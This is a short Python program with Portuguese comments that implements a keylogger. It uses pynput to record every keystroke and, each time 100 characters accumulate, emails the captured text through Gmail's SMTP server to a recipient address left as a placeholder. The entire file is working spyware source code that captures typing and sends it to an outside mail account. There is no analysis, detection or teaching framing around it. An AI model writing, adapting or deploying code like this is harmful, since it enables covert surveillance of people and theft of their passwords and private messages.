import pynput.keyboard
import smtplib

log = ""

def press(key):
    global log
    try:
        log = log + key.char
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    if len(log) >= 100:
        enviar_email(log)
        log = ""

def enviar_email(log):
    # Configurar um servidor SMTP para enviar e-mails.
    servidor_smtp = smtplib.SMTP("smtp.gmail.com", 587)
    servidor_smtp.starttls()
    servidor_smtp.login("<adicionar e-mail remetente>", "<senha de app (e-mail google) ou senha do e-mail>")

    # Criar um e-mail com os registros do keylogger.
    mensagem = f"Registros do Keylogger:\n\n{log}"

    # Enviar o e-mail.
    servidor_smtp.sendmail("<adicionar e-mail remetente>", "<adicionar e-mail destinatário>", mensagem)

    # Encerrar a conexão SMTP.
    servidor_smtp.quit()

# Iniciar o keylogger.
with pynput.keyboard.Listener(on_press=press) as listener:
    listener.join()